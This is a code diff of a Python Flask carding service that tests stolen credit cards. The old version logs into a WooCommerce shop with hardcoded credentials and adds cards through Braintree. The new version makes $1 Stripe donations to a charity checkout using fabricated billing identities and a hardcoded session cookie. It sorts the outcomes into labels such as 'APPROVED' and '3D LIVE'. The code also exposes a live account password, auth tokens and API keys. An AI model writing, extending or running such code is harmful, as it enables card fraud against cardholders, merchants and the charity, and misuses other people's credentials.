@@ -1,620 +1,531 @@
-from flask import Flask, request, jsonify
 import requests
-import re
+import random
 import json
+import re
+import time
 from datetime import datetime
+from typing import Dict, Tuple, Optional, Any
+from flask import Flask, request, jsonify
+import threading
 import os
-import logging
-from typing import Tuple, Optional, Dict, Any
-
-# Configure logging
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-class BraintreeAuthChecker:
+class StripeChargeAPI:
     def __init__(self):
-        self.session = requests.Session()
-        self.base_url = "https://precisionpowdertx.com"
-        self.braintree_auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjQ0MTUxODMsImp0aSI6IjUzZGFmY2EwLTg5YjMtNDY0Yy05MGYyLWU5YWM5MWJjMTQzNSIsInN1YiI6ImZzazZrdGd4ZjhoenBkdzQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzazZrdGd4ZjhoenBkdzQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6eyJwYXlwYWxfY2xpZW50X2lkIjoiQVNkMHE2aVBQZXpGRnRNWUtydWNRUUcxVFZLdGh0bVhTVm5Eemtta0JwWjJraWJSRVVJZUpIOEJFd3hobjgzQklVeEJ5eU16TWhxWjk0ajcifX0.4j-mg5KvlOdklmqqWvpEdVLUQazQtWctYZ5HAPdkIm4oUbPtrkFn89oVyR7RmNPczBY-o-L1u4lpWBlLtzQVug"
-        
-        # Common headers
-        self.headers = {
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
+        self.state_abbreviations = {
+            'alabama': 'AL', 'alaska': 'AK', 'arizona': 'AZ', 'arkansas': 'AR',
+            'california': 'CA', 'colorado': 'CO', 'connecticut': 'CT', 'delaware': 'DE',
+            'florida': 'FL', 'georgia': 'GA', 'hawaii': 'HI', 'idaho': 'ID',
+            'illinois': 'IL', 'indiana': 'IN', 'iowa': 'IA', 'kansas': 'KS',
+            'kentucky': 'KY', 'louisiana': 'LA', 'maine': 'ME', 'maryland': 'MD',
+            'massachusetts': 'MA', 'michigan': 'MI', 'minnesota': 'MN', 'mississippi': 'MS',
+            'missouri': 'MO', 'montana': 'MT', 'nebraska': 'NE', 'nevada': 'NV',
+            'new hampshire': 'NH', 'new jersey': 'NJ', 'new mexico': 'NM', 'new york': 'NY',
+            'north carolina': 'NC', 'north dakota': 'ND', 'ohio': 'OH', 'oklahoma': 'OK',
+            'oregon': 'OR', 'pennsylvania': 'PA', 'rhode island': 'RI', 'south carolina': 'SC',
+            'south dakota': 'SD', 'tennessee': 'TN', 'texas': 'TX', 'utah': 'UT',
+            'vermont': 'VT', 'virginia': 'VA', 'washington': 'WA', 'west virginia': 'WV',
+            'wisconsin': 'WI', 'wyoming': 'WY',
+            'district of columbia': 'DC', 'guam': 'GU', 'american samoa': 'AS',
+            'northern mariana islands': 'MP', 'puerto rico': 'PR', 'virgin islands': 'VI'
         }
-
-    def parse_card_data(self, lista: str) -> Optional[Dict[str, str]]:
-        """Parse card data from various formats"""
-        try:
-            parts = lista.split('|')
-            if len(parts) != 4:
-                return None
-            
-            cc = parts[0].strip()
-            mm = parts[1].strip()
-            yy = parts[2].strip()
-            cvv = parts[3].strip()
-            
-            # Clean month
-            mm = mm.split('/')[0] if '/' in mm else mm
-            mm = mm.zfill(2)
-            
-            # Clean year
-            yy = yy.split('/')[-1] if '/' in yy else yy
-            if len(yy) == 4:  # Convert 2026 to 26
-                yy = yy[2:]
-            yy = yy.zfill(2)
-            
-            if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()):
-                return None
-                
-            return {
-                'cc': cc,
-                'mm': mm,
-                'yy': yy,
-                'cvv': cvv,
-                'bin': cc[:6]
-            }
-        except Exception as e:
-            logger.error(f"Error parsing card data: {e}")
-            return None
-
-    def get_bin_info(self, bin_code: str) -> Dict[str, Any]:
-        """Get BIN information from antipublic API"""
-        try:
-            url = f"https://bins.antipublic.cc/bins/{bin_code}"
-            response = requests.get(url, timeout=10)
-            
-            if response.status_code == 200:
-                data = response.json()
-                return {
-                    'bank': data.get('bank', 'Unknown'),
-                    'brand': data.get('brand', 'Unknown'),
-                    'country': data.get('country_name', 'Unknown'),
-                    'level': data.get('level', 'Unknown'),
-                    'type': data.get('type', 'Unknown')
-                }
-        except Exception as e:
-            logger.error(f"Error fetching BIN info: {e}")
+        
+        self.email_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
+        
+        # Response messages mapping
+        self.response_messages = {
+            'APPROVED': 'Your transaction has been approved successfully.',
+            'CCN/CVV': 'Card verification failed. Please check your card details.',
+            '3D LIVE': '3D Secure authentication required.',
+            'INSUFFICIENT FUNDS': 'Insufficient funds. Please use a different payment method.',
+            'STRIPE AUTH': 'Authorization required. Please complete authentication.',
+            'DECLINED': 'Your transaction has been declined.',
+            'UNKNOWN': 'An unknown error occurred. Please try again later.'
+        }
+    
+    def parse_card_input(self, card_input: str) -> Dict:
+        """Parse card input in various formats"""
+        card_input = card_input.strip()
+        
+        # Handle different formats
+        if '|' in card_input:
+            parts = card_input.split('|')
+        elif '/' in card_input:
+            parts = card_input.split('/')
+        elif ' ' in card_input:
+            parts = card_input.split()
+        else:
+            # Try to parse based on length
+            if len(card_input) >= 16:
+                parts = [
+                    card_input[:16],
+                    card_input[16:18] if len(card_input) > 18 else '',
+                    card_input[18:20] if len(card_input) > 20 else '',
+                    card_input[20:] if len(card_input) > 20 else ''
+                ]
+            else:
+                raise ValueError("Invalid card format")
+        
+        if len(parts) < 4:
+            raise ValueError("Invalid card format. Use: ccn|mm|yy|cvv")
+        
+        ccn = parts[0].strip()
+        mm = parts[1].strip() if len(parts) > 1 else ''
+        yy = parts[2].strip() if len(parts) > 2 else ''
+        cvv = parts[3].strip() if len(parts) > 3 else ''
+        
+        # Clean card number
+        ccn = re.sub(r'\D', '', ccn)
+        
+        if not ccn or len(ccn) < 15:
+            raise ValueError("Invalid card number")
+        
+        # Handle month
+        if not mm or not mm.isdigit():
+            mm = str(random.randint(1, 12))
+        
+        # Handle year
+        if not yy or not yy.isdigit():
+            current_year = datetime.now().year % 100
+            yy = str(random.randint(current_year, current_year + 5))
+        
+        if len(yy) == 4:
+            yy = yy[2:]
+        elif len(yy) != 2:
+            yy = str(random.randint(23, 28))
+        
+        # Handle CVV
+        if not cvv or not cvv.isdigit():
+            cvv = str(random.randint(100, 999))
         
         return {
-            'bank': 'Unknown',
-            'brand': 'Unknown',
-            'country': 'Unknown',
-            'level': 'Unknown',
-            'type': 'Unknown'
+            'ccn': ccn,
+            'mm': mm.zfill(2),
+            'yy': yy,
+            'cvv': cvv
         }
-
-    def get_login_nonce(self) -> Tuple[Optional[str], Optional[str]]:
-        """Get login nonce from my-account page with exact pattern matching"""
+    
+    def get_bin_info(self, card_number: str) -> Optional[Dict]:
+        """Get BIN information from antipublic API"""
         try:
-            url = f"{self.base_url}/my-account/"
-            response = self.session.get(url, headers=self.headers, timeout=10)
+            # Get first 6 digits for BIN lookup
+            bin_number = card_number[:6]
+            url = f"https://bins.antipublic.cc/bins/{bin_number}"
             
-            logger.info(f"Login page status: {response.status_code}")
-            
-            if response.status_code != 200:
-                return None, f"Failed to load login page: {response.status_code}"
-            
-            # Exact pattern based on the HTML structure we saw
-            patterns = [
-                # Exact pattern from the HTML sample
-                r'<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="([^"]+)"',
-                # Alternative patterns
-                r'name="woocommerce-login-nonce" value="([^"]+)"',
-                r"name='woocommerce-login-nonce' value='([^']+)'",
-                r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"',
-            ]
-            
-            for i, pattern in enumerate(patterns):
-                nonce_match = re.search(pattern, response.text)
-                if nonce_match:
-                    nonce = nonce_match.group(1)
-                    logger.info(f"✅ Found login nonce with pattern {i}: {nonce}")
-                    return nonce, None
-            
-            # If still not found, do a more comprehensive search
-            logger.info("Trying comprehensive search for nonce...")
-            
-            # Search for any input with woocommerce-login-nonce
-            all_inputs = re.findall(r'<input[^>]*>', response.text)
-            for inp in all_inputs:
-                if 'woocommerce-login-nonce' in inp:
-                    logger.info(f"Found potential nonce input: {inp}")
-                    value_match = re.search(r'value="([^"]+)"', inp)
-                    if value_match:
-                        nonce = value_match.group(1)
-                        logger.info(f"Extracted nonce from input: {nonce}")
-                        return nonce, None
-            
-            logger.error("❌ Could not find login nonce with any pattern")
-            return None, "Could not find login nonce"
-            
-        except Exception as e:
-            logger.error(f"Error getting login nonce: {str(e)}")
-            return None, f"Error getting login nonce: {str(e)}"
-
-    def is_logged_in(self, html_content: str) -> bool:
-        """Check if login was successful"""
-        patterns = [
-            r'woocommerce-MyAccount-navigation',
-            r'Log out',
-            r'My Account',
-            r'Dashboard',
-            r'Welcome.*popalako09',  # Check for username in welcome message
-        ]
-        return any(re.search(pattern, html_content, re.IGNORECASE) for pattern in patterns)
-
-    def login(self) -> bool:
-        """Login to the account"""
-        try:
-            # Get login nonce first
-            nonce, error = self.get_login_nonce()
-            if error:
-                logger.error(f"Login failed - nonce error: {error}")
-                return False
-            
-            # Login data
-            login_data = {
-                'username': 'popalako09@gmail.com',
-                'password': '#Moha254$$',
-                'woocommerce-login-nonce': nonce,
-                '_wp_http_referer': '/my-account/',
-                'login': 'Log in',
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }
             
-            login_headers = self.headers.copy()
-            login_headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': self.base_url,
-                'referer': f"{self.base_url}/my-account/",
-                'cache-control': 'no-cache',
-            })
-            
-            logger.info("Attempting login...")
-            response = self.session.post(
-                f"{self.base_url}/my-account/",
-                data=login_data,
-                headers=login_headers,
-                timeout=15,
-                allow_redirects=True
-            )
-            
-            logger.info(f"Login response status: {response.status_code}")
-            logger.info(f"Login response URL: {response.url}")
-            
-            # Check if login was successful
-            logged_in = self.is_logged_in(response.text)
-            logger.info(f"Login successful: {logged_in}")
-            
-            if not logged_in:
-                # Check for error messages
-                error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response.text, re.DOTALL)
-                if error_match:
-                    logger.error(f"Login error: {error_match.group(1).strip()}")
-                else:
-                    logger.error("Login failed - unknown reason")
-            
-            return logged_in
-            
-        except Exception as e:
-            logger.error(f"Login error: {e}")
-            return False
-
-    def get_payment_nonce(self) -> Tuple[Optional[str], Optional[str]]:
-        """Get payment nonce from add-payment-method page"""
-        try:
-            url = f"{self.base_url}/my-account/add-payment-method/"
-            response = self.session.get(url, headers=self.headers, timeout=10)
-            
-            logger.info(f"Payment page status: {response.status_code}")
-            logger.info(f"Payment page URL: {response.url}")
-            
-            if response.status_code != 200:
-                return None, f"Failed to load payment page: {response.status_code}"
-            
-            # Debug the page content
-            logger.info(f"Response length: {len(response.text)}")
-            logger.info(f"Page contains 'woocommerce-add-payment-method-nonce': {'woocommerce-add-payment-method-nonce' in response.text}")
-            
-            # Try multiple patterns to find payment nonce - updated patterns
-            patterns = [
-                r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
-                r'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
-                r'woocommerce-add-payment-method-nonce["\'\s][^>]*value=["\']?([^"\'\s>]+)',
-                r'<input[^>]*name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
-                r'<input[^>]*id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"'
-            ]
-            
-            for i, pattern in enumerate(patterns):
-                nonce_match = re.search(pattern, response.text)
-                if nonce_match:
-                    nonce = nonce_match.group(1)
-                    logger.info(f"✅ Found payment nonce with pattern {i}: {nonce}")
-                    return nonce, None
-            
-            # If no pattern matches, try to find any hidden input with nonce in name
-            hidden_inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="[^"]*nonce[^"]*"[^>]*value="([^"]+)"', response.text)
-            if hidden_inputs:
-                logger.info(f"Found hidden nonce inputs: {hidden_inputs}")
-                return hidden_inputs[0], None
-            
-            # Last resort: search for any nonce-like values
-            all_nonces = re.findall(r'name="[^"]*nonce[^"]*"[^>]*value="([^"]+)"', response.text)
-            if all_nonces:
-                logger.info(f"Found all nonces: {all_nonces}")
-                return all_nonces[0], None
-            
-            # Debug: Check if we're actually on the right page
-            if "add-payment-method" not in response.url:
-                return None, f"Not on payment method page. Redirected to: {response.url}"
-            
-            # Check if we're logged in
-            if not self.is_logged_in(response.text):
-                return None, "Not logged in when accessing payment page"
-            
-            logger.error("❌ Could not find payment nonce with any pattern")
-            # Log a sample of the page to see what's there
-            logger.info(f"Sample of response text (first 1000 chars): {response.text[:1000]}")
-            return None, "Could not find payment nonce"
-            
-        except Exception as e:
-            logger.error(f"Error getting payment nonce: {str(e)}")
-            return None, f"Error getting payment nonce: {str(e)}"
-
-    def tokenize_card(self, card_data: Dict[str, str]) -> Tuple[Optional[str], Optional[str]]:
-        """Tokenize card through Braintree API"""
-        try:
-            braintree_headers = {
-                'Authorization': f'Bearer {self.braintree_auth_token}',
-                'Referer': 'https://assets.braintreegateway.com/',
-                'Braintree-Version': '2018-05-10',
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            }
-            
-            json_data = {
-                'clientSdkMetadata': {
-                    'source': 'client',
-                    'integration': 'custom',
-                    'sessionId': '27be0c13-9aa1-4f78-8d2d-2dd4db17b238',
-                },
-                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
-                'variables': {
-                    'input': {
-                        'creditCard': {
-                            'number': card_data['cc'],
-                            'expirationMonth': card_data['mm'],
-                            'expirationYear': f"20{card_data['yy']}",
-                            'cvv': card_data['cvv'],
-                        },
-                        'options': {
-                            'validate': False,
-                        },
-                    },
-                },
-                'operationName': 'TokenizeCreditCard',
-            }
-            
-            logger.info("Tokenizing card...")
-            response = requests.post(
-                'https://payments.braintree-api.com/graphql',
-                headers=braintree_headers,
-                json=json_data,
-                timeout=10
-            )
-            
-            logger.info(f"Braintree API response status: {response.status_code}")
+            response = requests.get(url, headers=headers, timeout=10)
             
             if response.status_code == 200:
-                data = response.json()
-                if 'data' in data and 'tokenizeCreditCard' in data['data']:
-                    token = data['data']['tokenizeCreditCard']['token']
-                    logger.info(f"Card tokenized successfully: {token[:20]}...")
-                    return token, None
-                else:
-                    error_msg = f"Tokenization failed: {data}"
-                    logger.error(error_msg)
-                    return None, error_msg
+                return response.json()
             else:
-                error_msg = f"Braintree API error: {response.status_code} - {response.text}"
-                logger.error(error_msg)
-                return None, error_msg
+                return None
                 
         except Exception as e:
-            logger.error(f"Tokenization error: {str(e)}")
-            return None, f"Tokenization error: {str(e)}"
-
-    def extract_response_message(self, html_content: str) -> str:
-        """Extract response message from HTML content with improved parsing"""
+            print(f"Error fetching BIN info: {e}")
+            return None
+    
+    def get_random_user_info(self, bin_info: Optional[Dict] = None) -> Dict:
+        """Fetch random user info from API"""
         try:
-            # First try to extract from woocommerce-error (failure case)
-            error_patterns = [
-                r'<ul class="woocommerce-error"[^>]*>.*?<li>\s*(.*?)\s*</li>',
-                r'<div class="woocommerce-error"[^>]*>.*?<li>\s*(.*?)\s*</li>',
-                r'class="woocommerce-error"[^>]*>.*?<li>\s*(.*?)\s*</li>',
-                r'woocommerce-error[^>]*>.*?<li>\s*(.*?)\s*</li>',
-            ]
+            # Use randomuser.me API
+            nat = 'us'
+            if bin_info and 'country' in bin_info:
+                country_code = bin_info['country'].lower()
+                # Map common country codes
+                country_map = {
+                    'us': 'us', 'gb': 'gb', 'ca': 'ca', 'au': 'au',
+                    'de': 'de', 'fr': 'fr', 'it': 'it', 'es': 'es',
+                    'br': 'br', 'mx': 'mx', 'in': 'in', 'jp': 'jp'
+                }
+                if country_code in country_map:
+                    nat = country_map[country_code]
+                elif len(country_code) == 2:
+                    # Try with the country code
+                    nat = country_code
             
-            for pattern in error_patterns:
-                error_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
-                if error_match:
-                    message = error_match.group(1).strip()
-                    # Clean up the message - remove extra HTML tags if any
-                    message = re.sub(r'<[^>]*>', '', message)
-                    logger.info(f"Extracted error message: {message}")
-                    return message
+            response = requests.get(f'https://randomuser.me/api/?nat={nat}')
+            data = response.json()
+            user = data['results'][0]
             
-            # Then try to extract from woocommerce-message (success case)
-            success_patterns = [
-                r'<ul class="woocommerce-message"[^>]*>.*?<li>\s*(.*?)\s*</li>',
-                r'<div class="woocommerce-message"[^>]*>.*?<li>\s*(.*?)\s*</li>',
-                r'class="woocommerce-message"[^>]*>.*?<li>\s*(.*?)\s*</li>',
-                r'woocommerce-message[^>]*>.*?<li>\s*(.*?)\s*</li>',
-            ]
+            # Format email
+            first_name = user['name']['first'].lower()
+            last_name = user['name']['last'].lower()
+            domain = random.choice(self.email_domains)
+            email = f"{first_name}.{last_name}@{domain}"
             
-            for pattern in success_patterns:
-                success_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
-                if success_match:
-                    message = success_match.group(1).strip()
-                    # Clean up the message - remove extra HTML tags if any
-                    message = re.sub(r'<[^>]*>', '', message)
-                    logger.info(f"Extracted success message: {message}")
-                    return message
+            # Format phone
+            phone = re.sub(r'\D', '', user['phone'])
             
-            # If no specific message found, check for generic indicators
-            if "woocommerce-error" in html_content:
-                return "Payment method addition failed (generic error)"
-            elif "woocommerce-message" in html_content:
-                return "Payment method added successfully"
+            # Get state/region
+            if nat == 'us':
+                state_name = user['location']['state'].lower()
+                state_abbr = self.state_abbreviations.get(state_name, 'NY')
             else:
-                return "Unknown response from payment gateway"
-                
-        except Exception as e:
-            logger.error(f"Error extracting response message: {str(e)}")
-            return "Error parsing response message"
-
-    def add_payment_method(self, token: str, payment_nonce: str) -> Tuple[Optional[str], Optional[str]]:
-        """Add payment method to account"""
-        try:
-            payment_data = {
-                'payment_method': 'braintree_credit_card',
-                'wc-braintree-credit-card-card-type': 'visa',
-                'wc-braintree-credit-card-3d-secure-enabled': '',
-                'wc-braintree-credit-card-3d-secure-verified': '',
-                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-                'wc_braintree_credit_card_payment_nonce': token,
-                'wc_braintree_device_data': '',
-                'wc-braintree-credit-card-tokenize-payment-method': 'true',
-                'woocommerce-add-payment-method-nonce': payment_nonce,
-                '_wp_http_referer': '/my-account/add-payment-method/',
-                'woocommerce_add_payment_method': '1',
+                state_abbr = user['location']['state'][:2].upper() if len(user['location']['state']) >= 2 else 'NY'
+            
+            return {
+                'member_first_name': user['name']['first'],
+                'member_last_name': user['name']['last'],
+                'billing_first_name': user['name']['first'],
+                'billing_last_name': user['name']['last'],
+                'member_name': f"{user['name']['first']} {user['name']['last']}",
+                'billing_address1': f"{user['location']['street']['number']} {user['location']['street']['name']}",
+                'billing_city': user['location']['city'],
+                'billing_state': state_abbr,
+                'billing_postal_code': str(user['location']['postcode']),
+                'billing_country': user['nat'].upper(),
+                'member_email_address': email,
+                'member_phone': phone,
+                'nat': user['nat']
             }
             
-            payment_headers = self.headers.copy()
-            payment_headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': self.base_url,
-                'referer': f"{self.base_url}/my-account/add-payment-method/",
-                'cache-control': 'no-cache',
-            })
-            
-            logger.info("Adding payment method...")
-            response = self.session.post(
-                f"{self.base_url}/my-account/add-payment-method/",
-                data=payment_data,
-                headers=payment_headers,
-                timeout=15,
-                allow_redirects=True
+        except Exception as e:
+            print(f"Error fetching random user: {e}")
+            return self.get_default_user_info(bin_info)
+    
+    def get_default_user_info(self, bin_info: Optional[Dict] = None) -> Dict:
+        """Provide default user info"""
+        country = 'US'
+        city = 'New York'
+        state = 'NY'
+        
+        if bin_info and 'country' in bin_info:
+            country = bin_info['country']
+            if country == 'GB':
+                city = 'London'
+                state = 'LN'
+            elif country == 'CA':
+                city = 'Toronto'
+                state = 'ON'
+            elif country == 'AU':
+                city = 'Sydney'
+                state = 'NSW'
+        
+        return {
+            'member_first_name': 'David',
+            'member_last_name': 'Aloysius',
+            'billing_first_name': 'David',
+            'billing_last_name': 'Aloysius',
+            'member_name': 'David Aloysius',
+            'billing_address1': 'Mall Rd, Library Msll Rd',
+            'billing_city': city,
+            'billing_state': state,
+            'billing_postal_code': '10080',
+            'billing_country': country,
+            'member_email_address': 'thebrokenfuxker@gmail.com',
+            'member_phone': '9042252059',
+            'nat': country
+        }
+    
+    def create_stripe_source(self, card_info: Dict, user_info: Dict) -> Optional[Dict]:
+        """Create Stripe source with card details"""
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        
+        guid = f"{random.getrandbits(128):032x}"
+        muid = f"{random.getrandbits(128):032x}"
+        sid = f"{random.getrandbits(128):032x}"
+        
+        data = {
+            'type': 'card',
+            'card[number]': card_info['ccn'],
+            'card[cvc]': card_info['cvv'],
+            'card[exp_month]': card_info['mm'],
+            'card[exp_year]': f"20{card_info['yy']}",
+            'guid': guid,
+            'muid': muid,
+            'sid': sid,
+            'payment_user_agent': 'stripe.js/1.0',
+            'time_on_page': str(random.randint(10000, 30000)),
+            'key': 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz'
+        }
+        
+        try:
+            response = requests.post(
+                'https://api.stripe.com/v1/sources',
+                headers=headers,
+                data=data,
+                timeout=30
             )
             
-            logger.info(f"Payment method response status: {response.status_code}")
-            logger.info(f"Payment method response URL: {response.url}")
-            
-            # Extract response message using improved parser
-            response_message = self.extract_response_message(response.text)
-            logger.info(f"Extracted response message: {response_message}")
-            
-            return response_message, None
-                    
+            if response.status_code == 200:
+                return response.json()
+            else:
+                print(f"Stripe response: {response.status_code} - {response.text[:200]}")
+                return None
+                
         except Exception as e:
-            logger.error(f"Payment method error: {str(e)}")
-            return None, f"Payment method error: {str(e)}"
-
-    def categorize_response(self, response_msg: str) -> str:
-        """Categorize Braintree response with improved keyword matching"""
-        response = response_msg.lower()
-
+            print(f"Error creating Stripe source: {e}")
+            return None
+    
+    def make_donation(self, stripe_source: Dict, user_info: Dict) -> requests.Response:
+        """Make donation with Stripe source"""
+        cookies = {
+            'connect.sid': 's%3AjgaYr-ih0CCISD0HY6tHLgh1CLRTi2_n.Mwlls%2B43ueFQnoL8gTPiC25aNdpXOsmUSQCZ9VhN2s0',
+            '__stripe_mid': f"{random.getrandbits(128):032x}",
+            '__stripe_sid': f"{random.getrandbits(128):032x}",
+        }
+        
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'content-type': 'application/json;charset=UTF-8',
+            'origin': 'https://donate.wck.org',
+            'referer': 'https://donate.wck.org/give/312884/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        
+        # Generate a realistic-looking token
+        token_parts = []
+        for _ in range(10):
+            token_parts.append(f"{random.getrandbits(256):064x}")
+        token = '-'.join(token_parts)
+        
+        json_data = {
+            'payment': {
+                'raw_currency_code': 'USD',
+                'stripe': {
+                    'status': 'ready',
+                    'source': {
+                        'id': stripe_source['id'],
+                        'object': 'source',
+                        'card': {
+                            'brand': stripe_source['card']['brand'],
+                            'exp_month': stripe_source['card']['exp_month'],
+                            'exp_year': stripe_source['card']['exp_year'],
+                            'last4': stripe_source['card']['last4'],
+                        },
+                        'client_secret': stripe_source['client_secret'],
+                        'created': stripe_source['created'],
+                        'livemode': True,
+                        'status': 'chargeable',
+                        'type': 'card',
+                    },
+                },
+                'method': 'Stripe',
+            },
+            'frequency': 'one-time',
+            'items': [{
+                'type': 'donation',
+                'product_name': 'Donation',
+                'raw_final_price': 1,
+            }],
+            'billing_address1': user_info['billing_address1'],
+            'billing_city': user_info['billing_city'],
+            'billing_state': user_info['billing_state'],
+            'billing_postal_code': user_info['billing_postal_code'],
+            'billing_country': user_info['billing_country'],
+            'member_name': user_info['member_name'],
+            'member_email_address': user_info['member_email_address'],
+            'member_phone': user_info['member_phone'],
+            'is_anonymous': False,
+            'opt_in': True,
+            'application_id': '11153',
+            'billing_first_name': user_info['billing_first_name'],
+            'billing_last_name': user_info['billing_last_name'],
+            'member_first_name': user_info['member_first_name'],
+            'member_last_name': user_info['member_last_name'],
+            'token': token,
+        }
+        
+        try:
+            response = requests.post(
+                'https://donate.wck.org/frs-api/campaign/312884/checkout',
+                cookies=cookies,
+                headers=headers,
+                json=json_data,
+                timeout=30
+            )
+            return response
+        except Exception as e:
+            print(f"Error making donation: {e}")
+            # Return a mock response for testing
+            return type('Response', (), {
+                'status_code': 400,
+                'text': '{"error": "Network error"}'
+            })()
+    
+    def categorize_response(self, response_text: str) -> Tuple[str, str]:
+        """Categorize response"""
+        response = response_text.lower()
+        
         approved_keywords = [
-            "approved", "approved. check customer id", "processed", 
-            "approved with risk", "approved for partial amount",
-            "auth declined but settlement captured", "payment method added successfully",
-            "success", "successful"
+            "succeeded", "payment-success", "successfully", "thank you for your support",
+            "your card does not support this type of purchase", "thank you",
+            "membership confirmation", "thank you for your payment",
+            "payment received", "your order has been received",
+            "purchase successful", "approved"
         ]
         
         insufficient_keywords = [
-            "insufficient funds", "limit exceeded", "cardholder's activity limit exceeded",
-            "exceeds withdrawal", "over limit"
+            "insufficient funds", "insufficient_funds"
         ]
         
+        auth_keywords = [
+            "mutation_ok_result", "requires_action"
+        ]
+
         ccn_cvv_keywords = [
-            "invalid credit card number", "invalid expiration date", "card account length error",
-            "card issuer declined cvv", "incorrect pin", "pin try exceeded", "invalid cvc",
-            "invalid cvv", "security code", "address verification failed",
-            "address verification and card security code failed",
-            "credit card number does not match method of payment",
-            "cvv", "security code", "verification code", "invalid number"
+            "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
+            "incorrect_cvv", "invalid_cvv", "invalid cvv", "cvc_check",
+            "security code is invalid", "security code is incorrect",
+            "zip code is incorrect", "zip code is invalid"
         ]
 
         live_keywords = [
-            "cardholder authentication required", "additional authorization required",
-            "3d secure", "mastercard securecode", "voice authorization required",
-            "declined– call for approval", "authentication required"
+            "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
         ]
-
+        
         declined_keywords = [
-            "do not honor", "expired card", "no account", "no such issuer",
-            "possible lost card", "possible stolen card", "fraud suspected",
-            "transaction not allowed", "cardholder stopped billing",
-            "cardholder stopped all billing", "invalid transaction", "violation",
-            "security violation", "declined", "call issuer", "pick up card",
-            "card reported as lost or stolen", "closed card", "settlement declined",
-            "processor declined", "declined– updated cardholder available",
-            "error– do not retry, call issuer", "declined– call issuer",
-            "invalid transaction data", "card not activated", "invalid credit card number",
-            "not authorized", "cannot be processed", "transaction declined"
-        ]
-
-        setup_error_keywords = [
-            "processor does not support this feature", "card type not enabled",
-            "set up error– merchant", "set up error– amount", "set up error– hierarchy",
-            "set up error– card", "set up error– terminal", "invalid merchant id",
-            "invalid merchant number", "invalid client id", "encryption error",
-            "invalid currency code", "configuration error", "invalid authorization code",
-            "invalid store", "invalid amount", "invalid sku number", "invalid credit plan",
-            "invalid level iii purchase", "invalid transaction division number",
-            "transaction amount exceeds the transaction division limit",
-            "merchant not mastercard securecode enabled", "invalid tax amount",
-            "invalid secure payment data", "invalid user credentials", "surcharge not permitted",
-            "inconsistent data", "verifications are not supported on this merchant account",
-            "91730", "not supported", "merchant account", "setup error"
+            "declined", "invalid", "failed", "error", "incorrect", "do_not_honor",
+            "card_declined", "transaction_not_permitted"
         ]
 
         if any(kw in response for kw in approved_keywords):
             return "APPROVED"
         elif any(kw in response for kw in ccn_cvv_keywords):
-            return "CCN/CVV ISSUE"
+            return "CCN/CVV"
         elif any(kw in response for kw in live_keywords):
-            return "3D/AUTH REQUIRED"
+            return "3D LIVE"
         elif any(kw in response for kw in insufficient_keywords):
-            return "INSUFFICIENT FUNDS/LIMIT"
-        elif any(kw in response for kw in setup_error_keywords):
-            return "SETUP ERROR"
+            return "INSUFFICIENT FUNDS"
+        elif any(kw in response for kw in auth_keywords):
+            return "STRIPE AUTH"
         elif any(kw in response for kw in declined_keywords):
             return "DECLINED"
         else:
-            return "UNKNOWN STATUS"
-
-    def check_card(self, lista: str) -> Dict[str, Any]:
-        """Main card checking function"""
